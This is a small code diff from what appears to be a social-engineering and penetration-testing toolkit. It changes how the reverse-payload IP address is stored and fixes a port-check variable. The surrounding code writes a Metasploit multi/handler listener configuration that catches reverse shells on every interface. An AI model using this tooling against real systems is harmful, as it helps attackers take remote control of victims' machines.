@@ -126,9 +126,8 @@ if check_options("IPADDR=") == 0:
     # if AUTO_DETECT=OFF prompt for IP Address
     match=re.search("AUTO_DETECT=OFF", data)
     if match:
-        ipaddr=raw_input(setprompt(["4"], "Enter the IP address for the payload (reverse)"))
-        filewrite.write(ipaddr)
-        filewrite.close()
+		ipaddr=raw_input(setprompt(["4"], "Enter the IP address for the payload (reverse)"))
+		update_options("IPADDR=" + ipaddr)
 
 # payload selection here
 try:
@@ -418,7 +417,7 @@ try:
 
                                 # here we prep our meta config to listen on all the ports we want - free hugs all around
                                 filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
-                                port_check = check_ports("%s/src/program_junk/meta_config_multipyinjector" % (definepath), shellcode_ports)
+                                port_check = check_ports("%s/src/program_junk/meta_config_multipyinjector" % (definepath), shellcode_port)
                                 if port_check == False:
                                     filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (choice9,shellcode_port))
                                     filewrite.close()
